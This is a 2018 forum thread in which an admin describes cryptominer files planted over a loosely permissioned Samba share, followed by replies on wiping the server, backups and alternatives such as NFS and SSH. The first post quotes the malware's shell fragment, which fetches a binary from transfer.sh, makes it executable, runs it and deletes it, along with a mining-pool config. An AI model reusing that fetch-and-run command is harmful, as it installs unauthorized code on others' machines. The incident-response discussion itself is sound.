---
title: "Cryptominer files deposited over samba - looking for advice"
date: 2018-05-17
forum: Security
---

### Post by ghostpiratebob on 2018-05-17
Hi folks,

Long time reader, first-time poster, hope I'm not breaking any rules by posting this here. I did have a look but didn't find anyone with this problem already.

I'm operating a small server at work and noticed some unusual files pop up in two of our users /home folders.

The files stood out as the names were all random; "kEygV7jS.so" etc.

Upon looking at them it was pretty obviously related to mining crypto (but no hits on Virustotal).

Most of it was compiled beyond recognition but a few bits of shell stuck out:

```
curl -s https://transfer.sh/JlBl/cn.bmp > systemd;
curl -s https://transfer.sh/uQSeW/cf.bmp > config.json;
chmod +x systemd;
./systemd;
rm -rf systemd;
rm -rf config.json
```

The first file 404's but the second file (config.json) is still up with lines like

```
    { "algo": "cryptonight",    ...
    "syslog": false,
    "log-file": null,
    ...
    "max-cpu-usage": 95,
    "cpu-priority": 2,
    "threads": null,
    "pools": [
        {
            "url": "167.99.235.46:443",
            "user": null,
            "pass": null,
            "keepalive": true,
            "nicehash": true,
            "variant": 1
        }...

```

Anyway not too difficult to guess what it was trying to do, not sure about the compiled parts though beyond a few instructions.

GLIBC_2.2 and GCC: (GNU) 4.8.5 20150623 (Red Hat 4.8.5-16) appear in the compiled part along with stuff like,

```
getdir
getuid
getpwuid
chdir
getppid
fork
exit
umask
setsid
samba_init_module
change_to_root_user
system
sleep
init_samba_module
...
```

My Samba security is pretty loose, I didn't want to annoy people at work with complicated file sharing permissions and passwords (lots of different computer types etc).

I thought my Samba was only talking to the local subnet and anyone on it was probably OK, but looking at the logs it seems like it came in through the smb service.

```
interfaces = 192.168.15.0/24 enp1s0f0
bind interfaces only = yes
```

I thought it might be safe to use smb.conf with some folders set up like:

```
        read only = no
        writeable = yes
        browseable = yes
        guest ok = yes
        force create mode = 0644
        force directory mode = 0755
        force group = user_name
        force user = user_name

```

It doesn't look like anything was actually executed and I'm going to set up some better security and logging to avoid this happening again but I was hoping to get some opinions on whether I should scorch the earth and nuke the server to be safe or if samba cannot execute code and therefore it probably didn't run.

There is nothing funny in the logs or top currently but not sure if that just means it has log/top bypass functionality (I'm not that up to date on malware).

Does anyone know if you can chmod +x and execute code purely from loose samba permissions in user folders? (.bash_profile etc are all clean)

I read that a lot of miners are placed in things like Chrome extensions these days so I'm not 100% sure how to tell if it came in over the net or through a local user's smb connection.

Any opinions are advice would be much appreciated, I can provide more info if anyone is interested.

Thanks and have a good one!

Bob.

---

### Post by TheFu on 2018-05-19
Nuke it from orbit. It's the only way to be sure.

You asked for opinions ... 

Samba is a liability.  Loose samba permissions is a greater liability, but the protocol is broken. Switching to a different protocol would be best.  Network storage connected to Windows is a liability. We've learned this over decades.

Assuming you can't make that change, I'd setup client-server based, versioned, automatic, daily, backups for all the storage that can be touched by Windows machines, using a "pull" method over ssh with ssh-key-based authentication retaining 60-120 days of backup versions.  No remote mounts. Definitely don't let the samba server have access to the backup server.
 
IMHO.

---

### Post by ghostpiratebob on 2018-05-19
Yeah might as well nuke it and tighten a few things up a little, I doubt anything actually got executed but won't be able to sleep unless I do.

The backups are all good, got daily incrementals going out for 2 months.

Figured this was a risk when I opened up the samba shares like that.

We have so many different machines on the network (Mac, Linux, Windows, different phones etc...) and most people just want to click on a folder and do what they need to do. It would be great if there was a network fileshare setup that works with everything and the users dont need to worry about security!

I know SMB kinda sucks but are there any other options? NFS is out because it doesn't work for Macs, AFP is mac only and that just leaves you with SMB.

 I think I have to either convince everyone to use complex unique passwords and password management utilities or switch to machine-based SSH keys, assuming SMB supports something like that.

With the hacks coming in through Chrome extension malware now though I don't even know if that will be enough. Probably need a way to protect against compromised extensions inside the network that might have visibility on the user's file system.

Thanks for posting, sounds like I have some reading to do and some users to annoy! ;)

---

### Post by HermanAB on 2018-05-20
Why do you think NFS doesn't work on Macs?  Just google for "NFS Mac OS".

However, NFS is also not secure.  Recently Microsoft has woken up and smelled the coffee, and Windows 10 now has SSH, so I have taken to using SSH for everything.

---

### Post by TheFu on 2018-05-20
NFSv4 can be secure, if used with server-to-server Kerberos.  In theory, it is secure enough to be used over the internet, though most people would just use a full VPN or sshfs.  But if an admin sets it up, end-users don't need to know anything.

NFSv3 is really easy to get working, but the only security is layer-2 IP security and properly manages uids and gids. That's probably why v3 is used more often outside corporate environments. Much easier than setting up a full Kerberos realm.

If it isn't clear, NFS is the native file sharing protocol for all Unix OSes. That's basically all of them, except Windows and some mainframes. Windows does have NFS clients and servers, but those are a pain, not free, and the Windows userid to Unix uid mapping isn't something lots of people have experience doing.

The main issue with Windows security is ... er ... Windows EULA which spells out exactly how they will update your system without your permission and scan/grab your data without your permission and if you encrypt the file system, then they will put the decryption keys on microsoft servers. Nice.

---

